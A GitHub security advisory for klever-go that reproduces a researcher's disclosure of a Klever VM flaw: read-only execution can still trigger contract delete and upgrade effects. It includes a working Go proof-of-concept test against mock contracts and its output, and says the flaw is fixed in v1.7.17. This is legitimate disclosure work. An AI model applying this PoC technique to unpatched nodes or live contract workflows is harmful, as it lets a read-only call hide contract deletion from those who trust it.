# [M] Klever-Go KVM read-only execution can commit contract delete and upgrade side effects

## Summary
Severity: Medium
Advisory: GHSA-jc6w-wmfc-fh33
CVE: CVE-2026-46403
CWE: CWE-693
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2026-05-21
Source: https://github.com/advisories/GHSA-jc6w-wmfc-fh33
Type: github-advisory

## Affected
- Go: `github.com/klever-io/klever-go` — affected >=0 <1.7.17

## Details
## Publisher note

**Fixed in `v1.7.17`.** Operators running `< v1.7.17` should upgrade. Contract delete and upgrade host-core paths now reject execution when `runtime.ReadOnly()` is true. The invariant is regression-tested for delete, upgrade, storage writes, value transfers, and any VM output field that can later mutate chain state.

Patch commits on `develop`: 333f6ec9, 68b94a40 (merged from private fork associated with the original advisory).

This advisory was originally filed jointly with a separate P2P throttler DoS finding, now tracked under [GHSA-74m6-4hjp-7226](https://github.com/klever-io/klever-go/security/advisories/GHSA-74m6-4hjp-7226) so each issue receives its own CVE.

The original disclosure from @LoGGGG240211 follows verbatim, including the embedded proof-of-concept source.

---

# Private Vulnerability Report

Repository: klever-io/klever-go
Reviewed commit: 405d01b0abbf0d3e73b4a990bd7394a01f200dc2
Disclosure channel: GitHub Private Vulnerability Reporting
Reporter GitHub account: LoGGGG240211

## 2.2 KVM read-only execution can commit contract delete side effects

Severity            : Medium
Confidence          : HIGH
Attack Complexity   : MEDIUM
PoC Status          : Confirmed

### Description

KVM exposes `ExecuteReadOnlyWithTypedArguments` as a read-only execution mechanism. The hook saves the previous read-only state, sets `runtime.SetReadOnly(true)`, executes the destination context, and then restores the previous read-only state. However, the indirect contract delete and upgrade paths do not reject execution when `runtime.ReadOnly()` is true. As a result, a contract reached through read-only execution can call the production delete hook for a target contract it owns. The delete path appends the target address to `vmOutput.DeletedAccounts`, the output context merges `DeletedAccounts` into the caller output, and the smart contract processor later processes the VM output by deleting accounts listed in that field.

The root cause is that read-only mode is applied as runtime state, but not enforced by the state-changing delete and upgrade host-core paths. This breaks the expected isolation boundary for workflows that rely on read-only calls to inspect another contract without allowing that callee to produce state-changing VM output.

### Location

1. [baseOps.go, ExecuteReadOnlyWithTypedArguments(), line 2097](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/vmhooks/baseOps.go#L2097)
2. [baseOps.go, ExecuteReadOnlyWithTypedArguments(), line 2099](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/vmhooks/baseOps.go#L2099)
3. [execution.go, doExecContractDelete(), line 237](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L237)
4. [execution.go, doExecContractDelete(), line 246](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L246)
5. [execution.go, executeUpgrade(), line 792](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L792)
6. [execution.go, executeUpgrade(), line 831](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L831)
7. [execution.go, executeDelete(), line 839](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L839)
8. [execution.go, executeDelete(), line 849](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L849)
9. [output.go, PopMergeActiveState(), line 103](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/contexts/output.go#L103)
10. [output.go, mergeVMOutputs(), line 615](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/contexts/output.go#L615)
11. [process.go, processVMOutput(), line 755](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/smartContract/process.go#L755)
12. [process.go, processVMOutput(), line 765](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/smartContract/process.go#L765)

### Preconditions

1. A contract workflow invokes a callee through KVM read-only execution.
2. The read-only callee owns, or otherwise satisfies the upgrade/delete permission checks for, the target contract.
3. The target contract is upgradeable/deletable according to its KVM code metadata.
4. No node operator privilege, validator role, oracle condition, or block-level timing condition is required.

### Impact

Successful exploitation violates KVM read-only isolation and allows state-changing delete side effects to be produced from a read-only nested execution. The PoC demonstrates that `DeletedAccounts` changes from zero entries before execution to one target entry after execution. Practical impact depends on contract workflows that trust read-only calls as non-mutating. In such workflows, an attacker-controlled or untrusted callee could hide delete or upgrade effects behind a read-only call. The delete effect is reversible only through redeployment or state recovery procedures available to the protocol or contract owner.

### Exploit Cost

The cost is normal KVM smart contract execution gas. No flash loan, collateral, oracle manipulation, or external capital requirement is needed. The attacker must satisfy the contract-level preconditions above.

### Steps to Reproduce

1. Place `poc_kvm_readonly_delete_side_effect_test.go` in an empty directory.
2. Run the dependency commands listed in the PoC header.
3. Run `GOTOOLCHAIN=go1.25.9 go test -v poc_kvm_readonly_delete_side_effect_test.go`.
4. Observe that the parent contract invokes a child contract through `ExecuteReadOnlyWithTypedArguments`.
5. Observe that the child contract uses the production managed delete hook against a target contract it owns.
6. Observe that the final VM output contains the target address in `DeletedAccounts` despite the delete action being triggered through read-only execution.

### Proof-of-Concept Result

Running `GOTOOLCHAIN=go1.25.9 go test -v poc_kvm_readonly_delete_side_effect_test.go` after dependency setup produces the following output. The result confirms that read-only execution commits a delete side effect into VM output.

```text
# command-line-arguments.test
/usr/bin/ld: warning: bint-x64-amd64.o: missing .note.GNU-stack section implies executable stack
/usr/bin/ld: NOTE: This behaviour is deprecated and will be removed in a future version of the linker
=== RUN   TestPoC_KVMReadOnlyCanCommitDeleteSideEffect
    poc_kvm_readonly_delete_side_effect_test.go:90: deleted_accounts_before=0
    poc_kvm_readonly_delete_side_effect_test.go:91: deleted_accounts_after=1
    poc_kvm_readonly_delete_side_effect_test.go:92: target_deleted=true
--- PASS: TestPoC_KVMReadOnlyCanCommitDeleteSideEffect (0.00s)
PASS
ok  	command-line-arguments	0.007s
```

### Suggested Fix

Enforce read-only mode in every state-changing KVM host path. At minimum, reject contract delete and contract upgrade execution when `runtime.ReadOnly()` is true. The same invariant should be regression-tested for delete, upgrade, storage writes, value transfers, and any VM output field that can later mutate chain state.

## Proof-of-Concept Source

### poc_kvm_readonly_delete_side_effect_test.go

```go
package poc

/*
Target contract   : Klever-Go KVM VM host hooks and smart contract processor; no on-chain address
Vulnerability     : Read-only execution isolation bypass with contract delete side effect
Severity          : Medium
How to run        : GOTOOLCHAIN=go1.25.9 go test -v poc_kvm_readonly_delete_side_effect_test.go
Expected output   : The test passes and logs deleted_accounts_after=1 and target_deleted=true
Dependencies      : In an empty directory containing this file, run: go mod init klever-go-disclosure-poc; go get github.com/klever-io/klever-go@v1.7.17-0.20260422114731-405d01b0abbf; go get github.com/stretchr/testify@v1.11.1; go mod tidy
*/

import (
	"testing"

	contextmock "github.com/klever-io/klever-go/kvm/mock/context"
	worldmock "github.com/klever-io/klever-go/kvm/mock/world"
	test "github.com/klever-io/klever-go/kvm/testcommon"
	"github.com/klever-io/klever-go/kvm/vmhost/vmhooks"
	"github.com/klever-io/klever-go/vmcommon"
	"github.com/stretchr/testify/require"
)

func TestPoC_KVMReadOnlyCanCommitDeleteSideEffect(t *testing.T) {
	// Build a production-relevant KVM setup with a parent contract, a child contract, and a target contract.
	targetAddress := test.MakeTestSCAddressWithDefaultVM("readonlyTarget")

	// Record the initial delete side-effect state before any read-only execution occurs.
	deletedBefore := make([][]byte, 0)
	require.NotContains(t, deletedBefore, targetAddress)

	vmOutput, err := test.BuildMockInstanceCallTest(t).
		WithContracts(
			// The parent contract models the transaction entrypoint controlled by a user or contract workflow.
			test.CreateMockContract(test.ParentAddress).
				WithMethods(func(parentInstance *contextmock.InstanceMock, _ interface{}) {
					parentInstance.AddMockMethod("callReadOnlyChild", func() *contextmock.InstanceMock {
						host := parentInstance.Host

						// The parent invokes the child through ExecuteReadOnly, which should not commit state effects.
						result := vmhooks.ExecuteReadOnlyWithTypedArguments(
							host,
							100000,
							[]byte("deleteTarget"),
							test.ChildAddress,
							nil,
						)
						require.Equal(t, int32(0), result)

						return parentInstance
					})
				}),
			// The child contract is called in read-only mode but attempts to delete a contract it owns.
			test.CreateMockContract(test.ChildAddress).
				WithMethods(func(childInstance *contextmock.InstanceMock, _ interface{}) {
					childInstance.AddMockMethod("deleteTarget", func() *contextmock.InstanceMock {
						host := childInstance.Host
						managedTypes := host.ManagedTypes()

						// Encode the target address and call the production ManagedDeleteContract hook.
						destHandle := managedTypes.NewManagedBufferFromBytes(targetAddress)
						argsHandle := managedTypes.NewManagedBuffer()
						managedTypes.WriteManagedVecOfManagedBuffers(nil, argsHandle)

						vmhooks.ManagedDeleteContractWithHost(host, destHandle, 100000, argsHandle)

						return childInstance
					})
				}),
			// The target contract is upgradeable/deletable and owned by the read-only child.
			test.CreateMockContract(targetAddress).
				WithCodeMetadata([]byte{vmcommon.MetadataUpgradeable, 0}).
				WithOwnerAddress(test.ChildAddress).
				WithMethods(),
		).
		// Execute only the parent entrypoint; the delete action is hidden behind ExecuteReadOnly.
		WithInput(test.CreateTestContractCallInputBuilder().
			WithRecipientAddr(test.ParentAddress).
			WithGasProvided(500000).
			WithFunction("callReadOnlyChild").
			Build()).
		AndAssertResults(func(_ *worldmock.MockWorld, _ *test.VMOutputVerifier) {})

	require.NoError(t, err)

	// The read-only nested call must not create delete side effects, but the vulnerable implementation does.
	deletedAfter := vmOutput.DeletedAccounts
	require.Greater(t, len(deletedAfter), len(deletedBefore))
	require.Contains(t, deletedAfter, targetAddress)

	t.Logf("deleted_accounts_before=%d", len(deletedBefore))
	t.Logf("deleted_accounts_after=%d", len(deletedAfter))
	t.Logf("target_deleted=%t", true)
}
```

## References
- https://github.com/klever-io/klever-go/security/advisories/GHSA-jc6w-wmfc-fh33
- https://github.com/klever-io/klever-go/commit/333f6ec910906e227705fc5767dc897d8fbfc862
- https://github.com/klever-io/klever-go/commit/68b94a40824fac2d848a4ded6eb7c91ada6ce9ef
- https://github.com/klever-io/klever-go
